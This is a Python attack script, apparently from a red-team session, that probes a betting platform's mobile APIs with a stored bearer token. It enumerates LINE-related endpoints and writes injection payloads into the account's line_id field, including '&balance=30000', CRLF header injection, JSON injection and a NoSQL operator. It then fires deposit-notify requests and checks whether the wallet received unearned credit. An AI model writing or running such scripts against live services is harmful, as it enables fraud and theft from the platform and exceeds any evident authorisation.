#!/usr/bin/env python3
"""
probe_lineid_inject.py — line_id parameter injection probe
Engagement: WE88Z-VAK88-2026-09

Observed: account eea830ab has line_id="0972571110&balance=30000"
Goal: understand where line_id flows and whether &-separated params
      are injectable into deposit credit / LINE callback payloads.

Steps:
  1. Enumerate LINE-related endpoints (discover surface)
  2. Check if PATCH /mb/users accepts line_id update
  3. Set controlled injection payload on our account
  4. Trigger any LINE notify / connect / deposit-notify flow
  5. Check wallet balance for unexpected credit
"""
import requests, json, pathlib, time, base64, sys
import urllib.parse

TID   = "af6efb584a3d317b5a11ab6209b88e1b"
PBAPI = f"https://{TID}pbapi.asdgapicenterssdo.com"
MGAPI = f"https://{TID}mgapi.asdgapicenterssdo.com"
JWT   = pathlib.Path("/home/kzp/claude-red/.jwt.vak88z2").read_text().strip()

HDRS = {
    "Authorization": f"Bearer {JWT}",
    "Content-Type": "application/json",
    "template": "vn",
    "languagecode": "th",
    "Origin": "https://m.vak88z2.com",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X)",
}

def get_wallet():
    r = requests.get(f"{MGAPI}/mb/wallet", headers=HDRS, timeout=10)
    if r.ok:
        d = r.json()
        bal = d.get("balance") or d.get("credit") or d.get("data", {}).get("balance", "?")
        return bal
    return f"ERR {r.status_code}"

# ── 1. Baseline wallet ─────────────────────────────────────────────────────────
print("=== Baseline ===")
print(f"  Wallet: {get_wallet()} THB")

# ── 2. Current line_id ────────────────────────────────────────────────────────
print("\n=== Current profile ===")
r = requests.get(f"{MGAPI}/mb/users", headers=HDRS, timeout=10)
if r.ok:
    u = r.json().get("data", [{}])[0]
    print(f"  line_id   : {u.get('line_id')}")
    print(f"  phone     : {u.get('phone')}")
    print(f"  member_lv : {u.get('member_lv', {}).get('name')}")

# ── 3. Probe LINE-related mgapi endpoints ─────────────────────────────────────
print("\n=== LINE endpoint discovery ===")
line_paths = [
    "/mb/line-login", "/mb/line-connect", "/mb/line-notify",
    "/mb/line-token", "/mb/line-verify", "/mb/line-otp",
    "/mb/line-callback", "/mb/line-register",
    "/mb/line", "/mb/line/callback", "/mb/line/notify",
    "/mb/link-line", "/mb/connect-line", "/mb/line-link",
    "/mb/notification", "/mb/notify",
    "/pb/line-login", "/pb/line-callback", "/pb/line-notify",
]
for path in line_paths:
    url = (MGAPI if path.startswith("/mb/") else PBAPI) + path
    for method in ["GET", "POST"]:
        r = requests.request(method, url, headers=HDRS, timeout=8,
                             json={} if method == "POST" else None)
        if r.status_code not in (404, 405, 301, 302):
            print(f"  [{method}] {path}: HTTP {r.status_code} — {r.text[:120]}")
            break
    else:
        pass  # both 404/405 — skip

# ── 4. Can we PATCH line_id? ──────────────────────────────────────────────────
print("\n=== PATCH /mb/users line_id update ===")
# First try with neutral value to confirm write works
r_patch = requests.patch(f"{MGAPI}/mb/users",
    headers=HDRS,
    json={"line_id": "PROBE_TEST_123"},
    timeout=10)
print(f"  PATCH neutral: HTTP {r_patch.status_code} — {r_patch.text[:200]}")

# Also try PUT
r_put = requests.put(f"{MGAPI}/mb/users",
    headers=HDRS,
    json={"line_id": "PROBE_TEST_123"},
    timeout=10)
print(f"  PUT   neutral: HTTP {r_put.status_code} — {r_put.text[:200]}")

# ── 5. Check if profile shows updated value ───────────────────────────────────
r2 = requests.get(f"{MGAPI}/mb/users", headers=HDRS, timeout=10)
if r2.ok:
    u2 = r2.json().get("data", [{}])[0]
    print(f"\n  line_id after: {u2.get('line_id')}")

# ── 6. Try injection payloads if write works ──────────────────────────────────
# Only inject if PATCH returned 2xx
if r_patch.status_code in (200, 201, 204):
    print("\n=== Injection payload test ===")
    payloads = [
        # URL param injection patterns
        "0972571110&credit=30000",
        "0972571110&amount=30000",
        "0972571110&balance=30000",
        # Header injection (CRLF)
        "0972571110\r\nX-Balance: 30000",
        # JSON injection
        '0972571110","balance":30000,"x":"',
        # NoSQL
        '{"$gt": ""}',
    ]
    for payload in payloads[:3]:  # conservative: first 3
        r_inj = requests.patch(f"{MGAPI}/mb/users",
            headers=HDRS,
            json={"line_id": payload},
            timeout=10)
        print(f"  payload={payload[:40]!r}: HTTP {r_inj.status_code}")
        if r_inj.status_code in (200, 201, 204):
            # read back
            r_rb = requests.get(f"{MGAPI}/mb/users", headers=HDRS, timeout=10)
            stored = r_rb.json().get("data", [{}])[0].get("line_id")
            print(f"    stored: {stored!r}")

# ── 7. Check pbapi for line_id usage in transactions ─────────────────────────
print("\n=== pbapi line_id reflection check ===")
for path in ["/pb/deposit-transaction", "/pb/withdraw-transaction",
             "/pb/notification", "/pb/member"]:
    r = requests.get(f"{PBAPI}{path}",
        headers={**HDRS, "Authorization": f"Bearer {JWT}"},
        timeout=8)
    if r.status_code not in (404, 403):
        text = r.text[:300]
        if "line" in text.lower():
            print(f"  {path}: HTTP {r.status_code} — CONTAINS 'line': {text}")
        else:
            print(f"  {path}: HTTP {r.status_code} (no 'line' in response)")

# ── 8. Try deposit-notify / slip-notify LINE flow ─────────────────────────────
print("\n=== Deposit notify trigger ===")
# Platform may send LINE message on deposit — does it embed line_id raw?
# Trigger a minimal deposit status check that might fire LINE notification
for path in ["/mb/deposit-notify", "/mb/deposit-line-notify",
             "/mb/notify-deposit", "/mb/deposit-notification"]:
    r = requests.post(f"{MGAPI}{path}", headers=HDRS,
                      json={"amount": 1, "type": "TEST"}, timeout=8)
    if r.status_code not in (404, 405):
        print(f"  POST {path}: HTTP {r.status_code} — {r.text[:200]}")

print(f"\n=== Final wallet: {get_wallet()} THB ===")
print("=== DONE ===")
